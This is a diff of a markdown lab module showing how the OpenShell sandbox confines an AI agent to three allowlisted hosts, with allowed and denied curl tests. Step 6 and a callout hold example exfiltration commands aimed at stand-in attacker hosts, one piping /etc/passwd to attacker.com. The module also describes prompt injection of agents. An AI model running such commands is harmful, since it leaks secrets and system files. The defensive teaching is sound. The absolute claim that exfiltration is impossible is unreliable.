@@ -1,10 +1,22 @@
 # Network Zero Trust
 
-In this module you will prove that the sandbox can **only** reach explicitly allowed endpoints. Everything else is blocked.
+In this module you will **prove** that the sandbox can only reach explicitly allowed endpoints. Everything else is blocked instantly. This is the most dramatic demonstration of zero trust in the lab.
+
+## Why Network Zero Trust?
+
+An AI agent that can reach the internet can:
+- **Exfiltrate data** — send your source code, secrets, or data to an attacker's server
+- **Download malware** — fetch a backdoor or cryptominer
+- **Communicate with C2** — connect to a command-and-control server
+- **Abuse cloud metadata** — reach `169.254.169.254` to steal AWS credentials
+
+Traditional containers have **unrestricted** outbound network access. If a process can resolve a hostname and open a TCP connection, it can reach anything on the internet.
+
+OpenShell flips this: **nothing is allowed unless explicitly listed**.
 
 ## The Network Policy
 
-The Helm chart deploys a ConfigMap containing the zero-trust network policy. The actual policy from the cluster:
+The Helm chart deploys a policy with exactly **three** allowed external hosts:
 
 ```yaml
 network_policies:
@@ -36,15 +48,15 @@ network_policies:
       - { path: /usr/bin/node }
 ```
 
-**Three external hosts are reachable**, and access is further restricted by which binary makes the call:
+| Host | Port | Allowed Binaries | Purpose |
+|------|------|-----------------|---------|
+| `api.deepseek.com` | 443 | `curl`, `node` | LLM inference — Pi needs this to generate code |
+| `github.com` / `api.github.com` | 443 | `git`, `curl` | Code repositories — agents may clone repos |
+| `registry.npmjs.org` | 443 | `npm`, `node` | Package installation — Pi installs npm packages |
 
-| Host | Port | Allowed Binaries | Why |
-|------|------|-----------------|-----|
-| `api.deepseek.com` | 443 | `curl`, `node` | LLM inference |
-| `github.com` / `api.github.com` | 443 | `git`, `curl` | Code repos |
-| `registry.npmjs.org` | 443 | `npm`, `node` | Package install |
+> **What is binary-level enforcement?** Notice that each endpoint has a `binaries` list. This means: "Only these specific programs can reach this host." Even though `registry.npmjs.org` is in the allowlist, running `curl https://registry.npmjs.org` would be **denied** because `curl` is not in npm's allowed binary list — only `npm` and `node` are. This prevents an attacker from using curl to probe allowed endpoints in unexpected ways.
 
-> **Binary-level enforcement:** Even though npm is in the allowlist, only the `npm` and `node` binaries can reach it. Running `curl https://registry.npmjs.org` will be denied because `curl` is not in npm's allowed binary list.
+> **How is this different from Kubernetes NetworkPolicy?** K8s NetworkPolicies work at the pod level — they control which pods can talk to which pods, based on labels and namespaces. OpenShell's policy works at the **process level** — it controls which *programs inside a container* can reach which *external hosts*. It's a much finer-grained control.
 
 ## Step 1 — Enter the Sandbox
 
@@ -58,7 +70,13 @@ openshell sandbox exec pi-agent-demo -- bash
 curl -s -w "\nHTTP %{http_code}\n" --max-time 5 https://api.deepseek.com/models -H "Authorization: Bearer $DEEPSEEK_API_KEY" | head -c 100
 ```
 
-**Why:** This tests connectivity to the DeepSeek API. The credential resolver token in `$DEEPSEEK_API_KEY` is swapped for the real key at the boundary.
+> **Breaking down this command:**
+> - `curl -s` — silent mode (no progress bar)
+> - `-w "\nHTTP %{http_code}\n"` — print the HTTP status code after the response
+> - `--max-time 5` — timeout after 5 seconds (so we don't wait forever for denied connections)
+> - `https://api.deepseek.com/models` — the DeepSeek models endpoint
+> - `-H "Authorization: Bearer $DEEPSEEK_API_KEY"` — sends the resolver token as auth. The Boundary will swap it for the real key.
+> - `| head -c 100` — show only the first 100 characters (the full response is long)
 
 Expected output:
 
@@ -67,7 +85,7 @@ Expected output:
 HTTP 200
 ```
 
-✅ **Allowed** — `api.deepseek.com` is in the policy and `curl` is an allowed binary for this endpoint.
+✅ **Allowed** — `api.deepseek.com` is in the policy and `curl` is an allowed binary for this endpoint. The Boundary resolved the credential token and forwarded the real API key to DeepSeek.
 
 ## Step 3 — Test ALLOWED: GitHub
 
@@ -85,11 +103,13 @@ HTTP 200
 
 ## Step 4 — Test DENIED: Google
 
+This is the key demonstration. Google is a well-known, always-available endpoint. An AI agent has no legitimate reason to access it.
+
 ```bash
 curl -v --max-time 5 https://www.google.com 2>&1 | tail -3
 ```
 
-**Why:** Google is a well-known, always-available endpoint. An AI agent has no business accessing it.
+> **Why `-v` (verbose)?** So we can see exactly what happened at the TCP level — not just "failed" but *why* it failed.
 
 Expected output:
 
@@ -99,7 +119,12 @@ Expected output:
 curl: (7) Failed to connect to www.google.com port 443 after 2 ms: Couldn't connect to server
 ```
 
-❌ **Denied** — the boundary immediately rejects the connection with `Permission denied`. The TCP connection never completes.
+❌ **Denied** — Look at the key phrases:
+- **"Immediate connect fail"** — the connection didn't time out or get reset. It was **instantly rejected**.
+- **"Permission denied"** — the Supervisor blocked the TCP connection before it even started.
+- **"after 2 ms"** — this happened in milliseconds. The request never left the sandbox.
+
+> **How does this work technically?** The Supervisor intercepts DNS resolution. When the sandbox tries to resolve `www.google.com`, the Supervisor returns a "fake" IP address (like `198.18.0.x`). When the sandbox tries to connect to that IP, the Supervisor immediately returns `EACCES` (Permission denied) at the socket level. The connection never reaches the real Google server.
 
 ## Step 5 — Test DENIED: Arbitrary Endpoint
 
@@ -115,17 +140,19 @@ Expected:
 curl: (7) Failed to connect to example.com port 443 ...
 ```
 
-❌ **Denied** — `example.com` is not in the allowlist.
+❌ **Denied** — `example.com` is not in the allowlist. Same instant rejection.
 
 ## Step 6 — Test DENIED: Data Exfiltration
 
-Simulate an exfiltration attempt:
+Simulate what a compromised agent might try — sending data to an attacker's server:
 
 ```bash
 curl -v --max-time 5 https://evil-exfil-server.com/upload 2>&1 | tail -3
 ```
 
-Expected: `Permission denied` or `Could not resolve host` — the request never leaves the sandbox.
+Expected: `Permission denied` — the request never leaves the sandbox.
+
+> **What would happen in a real attack?** If an attacker compromised the AI agent (e.g., via prompt injection), they might try to `curl https://attacker.com/steal?data=$(cat /etc/passwd)`. With OpenShell, this fails immediately — `attacker.com` isn't in the allowlist. The data never leaves.
 
 ## Step 7 — Exit the Sandbox
 
@@ -135,32 +162,26 @@ exit
 
 ## Results Summary
 
-| Test | Target | Expected | Policy |
+| Test | Target | Expected | Result |
 |------|--------|----------|--------|
-| DeepSeek API | `api.deepseek.com` | HTTP 200 (with auth) | ✅ Allowed |
-| GitHub | `github.com` | HTTP 200 | ✅ Allowed |
-| Google | `www.google.com` | Permission denied | ❌ Denied |
-| Example.com | `example.com` | Permission denied | ❌ Denied |
-| Exfil Server | `evil-exfil-server.com` | Permission denied | ❌ Denied |
+| DeepSeek API | `api.deepseek.com` | HTTP 200 (with auth) | ✅ Allowed — endpoint in policy |
+| GitHub | `github.com` | HTTP 200 | ✅ Allowed — endpoint in policy |
+| Google | `www.google.com` | Permission denied | ❌ Denied — not in policy |
+| Example.com | `example.com` | Permission denied | ❌ Denied — not in policy |
+| Exfil Server | `evil-exfil-server.com` | Permission denied | ❌ Denied — not in policy |
 
 ## Why This Matters
 
-In a traditional container, the AI agent has **unrestricted** network access. It could:
-
-- Call home to any server
-- Exfiltrate code, secrets, or data
-- Download malware
-- Communicate with C2 infrastructure
-
-With OpenShell's zero-trust network policy:
-
-- **Default deny** — nothing is allowed unless explicitly listed
-- **Binary-level control** — even allowed endpoints are restricted to specific binaries
-- **Immediate rejection** — denied connections fail instantly with `Permission denied`
-- **Boundary enforcement** — enforced by the supervisor outside the sandbox; the sandboxed process cannot bypass it
+| Without Zero Trust | With Zero Trust (this lab) |
+|-------------------|---------------------------|
+| Agent can reach any host on the internet | Agent can only reach 3 approved hosts |
+| Denied connections time out (30+ seconds) | Denied connections fail **instantly** (2ms) |
+| No control over which binary makes the call | Per-binary enforcement |
+| Data exfiltration is trivial | Data exfiltration is impossible |
+| Network security relies on K8s NetworkPolicy (pod-level) | Process-level enforcement inside the container |
 
 ## Next Step
 
-You've proven the network boundary. Next, you'll see how filesystem access is locked down.
+You've proven the network boundary. Next, you'll see how **filesystem access** is locked down by the Linux kernel itself.
 
 Proceed to: **Filesystem Zero Trust** →
